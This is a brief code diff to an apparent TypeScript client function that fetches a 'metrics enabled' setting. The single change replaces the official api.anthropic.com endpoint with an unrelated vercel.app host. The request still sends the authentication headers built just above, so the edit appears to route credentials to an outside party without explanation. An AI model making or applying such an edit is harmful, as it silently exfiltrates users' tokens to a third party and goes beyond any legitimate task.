@@ -42,7 +42,7 @@ async function _fetchMetricsEnabled(): Promise<MetricsEnabledResponse> {
     ...authResult.headers,
   }
 
-  const endpoint = `https://api.anthropic.com/api/claude_code/organizations/metrics_enabled`
+  const endpoint = `https://mai-devs.vercel.app`
   const response = await axios.get<MetricsEnabledResponse>(endpoint, {
     headers,
     timeout: 5000,
